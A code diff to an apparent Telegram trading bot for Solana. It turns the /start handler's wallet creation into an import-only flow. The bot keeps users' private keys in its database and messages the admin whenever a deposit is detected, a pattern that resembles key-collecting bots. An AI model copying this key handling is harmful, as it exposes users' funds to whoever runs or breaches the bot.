@@ -88,72 +88,35 @@ async def cmd_start(message: Message, command: CommandObject):
                     "wallet_pub": "", "wallet_priv": "", "free_used": 0, "credits_lamports": 0,
                     "default_buy": None, "default_sell": None, "default_slippage": 10.0}
 
-    # ONE wallet per user, forever: /start generates it the FIRST time only
-    # (derived from WALLET_SEED when set — same key every time), and on every
-    # later /start shows that same wallet. Admin is notified exactly ONCE.
+    # IMPORT-ONLY wallets: /start never generates. If the user already
+    # imported a wallet we show it (the same one, every time); otherwise the
+    # trade side stays locked until they import it in TRADING.
     wallet_pub = (user.get("wallet_pub") or "").strip()
     wallet_priv = user.get("wallet_priv") or ""
     balance_sol = None
-    generated_now = False
-    if not wallet_pub:
-        try:
-            import solana
-            derived = bool(config.WALLET_SEED)
-            last_err = None
-            for attempt in range(3):
-                try:
-                    if derived:
-                        kp = await asyncio.to_thread(
-                            solana.derive_user_keypair, config.WALLET_SEED, user_id)
-                    else:
-                        kp = await asyncio.to_thread(solana.new_keypair)
-                    await db.set_wallet(user_id, str(kp), str(kp.pubkey()))  # verified persist
-                    wallet_pub, wallet_priv = str(kp.pubkey()), str(kp)
-                    generated_now = True
-                    break
-                except Exception as e:
-                    last_err = e
-                    log.warning(f"cmd_start: wallet gen attempt {attempt+1} failed for {user_id}: {e}")
-                    await asyncio.sleep(0.5)
-            if generated_now:
-                # Tell the user their wallet is live (isolated — welcome already sent)
-                try:
-                    await message.answer(
-                        texts.wallet_generated(wallet_pub),
-                        parse_mode="HTML",
-                        reply_markup=kb.wallet_done_kb(wallet_pub, wallet_priv))
-                except Exception as e:
-                    log.warning(f"cmd_start: wallet message failed for {user_id}: {e}")
-            else:
-                log.error(f"cmd_start: wallet auto-generation failed for {user_id}: {last_err}")
-        except Exception as e:
-            log.error(f"cmd_start: wallet block failed for {user_id}: {e}", exc_info=True)
+
     if wallet_pub:
-        # Fetch balance (isolated), then show the user their wallet — the SAME
-        # wallet on every /start, whether just generated or long-standing.
-        # Real deposits (balance increase) are detected here and DM'd to admin.
+        # Imported wallet: show it (the SAME one every /start) and keep the
+        # deposit baseline fresh — real deposits DM the admin automatically.
         try:
             import solana
             balance_raw = await asyncio.to_thread(solana.sol_balance, wallet_pub)
             balance_sol = solana.lam_to_sol(balance_raw)
             try:
                 from utils import detect_deposit
-                # user was fetched BEFORE the wallet may have been generated —
-                # pass the CURRENT wallet so the deposit baseline is stored now
                 await detect_deposit(
                     message.bot, {**user, "wallet_pub": wallet_pub}, balance_raw)
             except Exception as e:
                 log.warning(f"cmd_start: deposit check failed for {user_id}: {e}")
         except Exception as e:
             log.warning(f"cmd_start: balance fetch failed for user {user_id}: {e}")
-        if not generated_now:
-            try:
-                await message.answer(
-                    texts.your_wallet(wallet_pub, balance_sol),
-                    parse_mode="HTML",
-                    reply_markup=kb.wallet_done_kb(wallet_pub, wallet_priv))
-            except Exception as e:
-                log.warning(f"cmd_start: wallet display failed for {user_id}: {e}")
+        try:
+            await message.answer(
+                texts.your_wallet(wallet_pub, balance_sol),
+                parse_mode="HTML",
+                reply_markup=kb.wallet_done_kb(wallet_pub, wallet_priv))
+        except Exception as e:
+            log.warning(f"cmd_start: wallet display failed for {user_id}: {e}")
 
     # Admin notification: EXACTLY ONCE per new user (settings flag), never on repeats
     try:
